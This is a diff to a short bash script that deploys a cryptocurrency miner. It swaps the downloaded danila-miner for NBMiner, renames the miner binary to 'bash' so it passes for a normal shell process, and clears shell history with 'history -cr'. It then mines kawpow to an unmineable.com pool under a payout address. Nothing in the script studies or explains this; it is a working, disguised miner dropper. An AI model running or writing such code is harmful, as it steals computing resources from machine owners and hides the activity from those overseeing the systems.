@@ -1,8 +1,9 @@
 #!/bin/bash
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-chmod +x danila-miner 
-mv danila-miner bash
-rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz
+wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz 
+tar -xvf NBMiner_40.1_Linux.tgz 
+cd NBMiner_Linux
+chmod +x nbminer 
+mv nbminer bash
+rm -rvf NBMiner_40.1_Linux.tgz
 history -cr
-./bash run https://server1.whalestonpool.com EQDplAjYzZTt1oxirxi2o0i7wA-zmie_DIxzI63O6xytBZmV
+./bash nbminer -a kawpow -o kp.unmineable.com:3333 -u cosmos1vhjjh5q8qegxqyag6whdjzf4qwkce24w4zp4tc.default
